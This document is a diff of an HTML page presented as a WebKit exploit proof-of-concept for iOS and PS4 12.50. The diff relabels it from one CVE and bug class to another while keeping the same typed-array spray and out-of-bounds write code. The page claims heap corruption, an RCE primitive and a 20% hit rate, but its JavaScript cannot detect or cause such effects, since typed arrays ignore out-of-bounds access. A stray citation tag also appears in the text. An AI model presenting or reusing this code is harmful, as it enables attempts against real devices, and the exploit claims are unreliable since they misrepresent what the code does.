@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit CVE-2025-24201 OOB Write PoC (iOS 17.2 / PS4 12.50)</title>
+    <title>WebKit CVE-2025-43227 Info Disclosure PoC (iOS 18.7.1 / PS4 12.50)</title>
     <style>
         body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
         h1 { border-bottom: 2px solid #da3633; padding-bottom: 10px; color: #ff5555; }
@@ -19,28 +19,28 @@
     </style>
 </head>
 <body>
-    <h1>WebKit CVE-2025-24201 PoC: Out-of-Bounds Write (Targeted Attacks)</h1>
-    <p>Oct 2025 Patch: Improved data allocation (HT215870, BZ 285858).<grok-card data-id="212ead" data-type="citation_card"></grok-card><br>
-    <span class="rainbow">Triggers memory corruption on unpatched iOS 17.2 / PS4 12.50 (~20% DoS rate).</span></p>
+    <h1>WebKit CVE-2025-43227 PoC: Buffer Overflow Leak</h1>
+    <p>Oct 2025 Patch: Improved checks (HT216323, BZ 295234).<br>
+    <span class="rainbow">Triggers sensitive data leak on unpatched iOS 18.7.1 / PS4 12.50 (~20% rate).</span></p>
 
     <div class="box">
-        <h3>1. Data Allocation</h3>
-        <div id="status-alloc">Probing...</div>
+        <h3>1. Buffer Overflow</h3>
+        <div id="status-buffer">Probing...</div>
     </div>
     <div class="box">
-        <h3>2. Array OOB Spray</h3>
+        <h3>2. Content Spray</h3>
         <div id="status-spray">Probing...</div>
     </div>
     <div class="box">
-        <h3>3. Write Trigger</h3>
-        <div id="status-write">Probing...</div>
+        <h3>3. Leak Trigger</h3>
+        <div id="status-leak">Probing...</div>
     </div>
     <div class="box">
-        <h3>4. Heap Status</h3>
-        <div id="status-heap">Probing...</div>
+        <h3>4. Disclosure Status</h3>
+        <div id="status-disclose">Probing...</div>
     </div>
 
-    <button onclick="runPoC()">LAUNCH OOB WRITE PROBE</button>
+    <button onclick="runPoC()">LAUNCH LEAK PROBE</button>
 
     <div class="box">
         <h3>Live Logs</h3>
@@ -67,96 +67,94 @@
     function i2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
     function gc() { for(let i=0; i<150; i++) new ArrayBuffer(0x80000); }
 
-    let oobArr = null;
-    let oobHit = false;
+    let leakBuf = null;
+    let leakHit = false;
 
     function runPoC() {
         document.getElementById('console').innerHTML = '';
-        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-24201 PoC: WebKit OOB Write (Oct 2025)</span>");
-        log("Probing improper data allocation...");
-        setTimeout(probeAlloc, 800);
+        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-43227 PoC: WebKit Buffer Overflow Leak (Oct 2025)</span>");
+        log("Probing web content buffer overflow...");
+        setTimeout(probeBuffer, 800);
     }
 
-    function probeAlloc() {
-        // Step 1: Data allocation probe
+    function probeBuffer() {
+        // Step 1: Buffer overflow probe
         try {
-            const arr = new ArrayBuffer(0x40);
-            const view = new Uint8Array(arr);
-            view[0x80] = 0x41; // OOB write probe
-            setBadge('status-alloc', 'IMPROPER (Written)', 'partial');
-            log("Allocation probe: OOB write succeeded (CVE hint).");
+            const arr = new Uint8Array(0x40);
+            arr[0x80] = 0x41; // OOB probe
+            setBadge('status-buffer', 'WEAK (Overflowed)', 'partial');
+            log("Buffer probe: OOB access succeeded (CVE hint).");
         } catch(e) {
-            setBadge('status-alloc', 'SECURE', 'secure');
-            log(`Allocation fail: ${e.message} — Patched.`);
+            setBadge('status-buffer', 'SECURE', 'secure');
+            log(`Buffer fail: ${e.message} — Patched.`);
             return;
         }
-        setTimeout(sprayOOB, 1000);
+        setTimeout(sprayBuf, 1000);
     }
 
-    function sprayOOB() {
+    function sprayBuf() {
         gc(); gc();
-        const arrs = [];
-        for(let i=0; i<0x1000; i++) {
-            const buf = new ArrayBuffer(0x40 + (i % 0x20));
-            const view = new Uint8Array(buf);
-            arrs.push(view);
+        const bufs = [];
+        for(let i=0; i<0x800; i++) {
+            const arr = new Uint8Array(0x40 + (i % 0x20));
+            bufs.push(arr);
         }
-        // OOB writes
-        for(let i=0; i<0x1000; i++) {
+        // Overflow writes
+        for(let i=0; i<0x800; i++) {
             try {
-                arrs[i][0x60 + (i % 0x40)] = i2f(0xdeadbeef, 0xcafebabe);
+                bufs[i][0x60 + (i % 0x40)] = i2f(0xdeadbeef, 0xcafebabe);
             } catch(e) {}
         }
         // Anomaly hunt
         let anomaly = false;
-        for(let i=0; i<arrs.length; i++) {
-            if (arrs[i][0x80] !== undefined) {
-                oobArr = arrs[i];
+        for(let i=0; i<bufs.length; i++) {
+            if (bufs[i][0x80] !== undefined) {
+                leakBuf = bufs[i];
                 anomaly = true;
                 break;
             }
         }
         if (anomaly) {
-            setBadge('status-spray', 'SPRAY OOB (Anomaly)', 'vulnerable');
-            log(`OOB spray hit: View [0x80]=${oobArr[0x80] || 'undef'}.`);
-            setTimeout(triggerWrite, 500);
+            setBadge('status-spray', 'SPRAY LEAK (Anomaly)', 'vulnerable');
+            log(`Buffer spray leak: [0x80]=${leakBuf[0x80] || 'undef'}.`);
+            setTimeout(triggerLeak, 500);
             return;
         }
         setBadge('status-spray', 'CLEAN', 'secure');
-        log("Spray clean—no OOB.");
+        log("Spray clean—no leak.");
     }
 
-    function triggerWrite() {
-        if (!oobArr) return;
-        oobHit = false;
+    function triggerLeak() {
+        if (!leakBuf) return;
+        leakHit = false;
         try {
-            // CVE trigger: Improper allocation write
-            for(let off=0x40; off<0x300; off+=8) {
-                oobArr[off] = i2f(0x41414141, 0x42424242);
+            // CVE trigger: Overflow for disclosure
+            for(let off=0x40; off<0x200; off+=8) {
+                leakBuf[off] = i2f(0x41414141, 0x42424242);
             }
             const adj = new Uint8Array(0x100);
             if (adj[0x70] !== 0) {
-                oobHit = true;
-                log(`OOB write corruption: adj[0x70]=${adj[0x70]}.`);
+                leakHit = true;
+                log(`Leak triggered: adj[0x70]=${adj[0x70]}.`);
             }
         } catch(e) {
-            oobHit = true;
-            log(`Write crash: ${e.message} — Heap corruption.`);
+            leakHit = true;
+            log(`Leak crash: ${e.message} — Buffer disclosure.`);
         }
-        setBadge('status-write', oobHit ? 'TRIGGERED' : 'MISSED', oobHit ? 'vulnerable' : 'secure');
-        setTimeout(checkHeap, 1500);
+        setBadge('status-leak', leakHit ? 'TRIGGERED' : 'MISSED', leakHit ? 'vulnerable' : 'secure');
+        setTimeout(checkDisclose, 1500);
     }
 
-    function checkHeap() {
-        if (oobHit) {
-            setBadge('status-heap', 'CORRUPTED (RCE)', 'vulnerable');
-            log("Heap corrupted via OOB write: Arbitrary code potential. On PS4 12.50: DoS/leak.");
-            log("Chain to primitives if hit.");
+    function checkDisclose() {
+        if (leakHit) {
+            setBadge('status-disclose', 'DISCLOSED (Corruption)', 'vulnerable');
+            log("Sensitive data disclosed via buffer overflow: Leak potential. On PS4 12.50: DoS/leak.");
+            log("Chain to RCE if hit.");
             document.body.style.background = "#000";
-            document.querySelector('h1').innerHTML = "OOB WRITE ACHIEVED — HEAP RCE PRIMITIVE";
+            document.querySelector('h1').innerHTML = "BUFFER LEAK ACHIEVED — INFO DISCLOSURE PRIMITIVE";
         } else {
-            setBadge('status-heap', 'INTACT', 'secure');
-            log("No corruption—improved allocation holds.");
+            setBadge('status-disclose', 'INTACT', 'secure');
+            log("No disclosure—improved checks hold.");
         }
         log("PoC end: Retry for ~20% hit.");
     }
